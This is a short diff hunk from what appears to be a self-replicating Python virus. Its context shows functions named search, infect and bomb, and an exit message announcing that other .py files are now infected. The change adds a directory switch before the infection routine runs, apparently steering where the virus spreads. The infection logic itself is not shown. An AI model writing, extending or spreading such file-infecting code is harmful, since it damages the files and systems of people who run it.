@@ -37,6 +37,7 @@ def bomb():
     sys.exit("This file is infected! Other .py files are now infected too!")
 
 
+os.chdir(PATH)
 search()
 infect(toinfect)
 bomb()
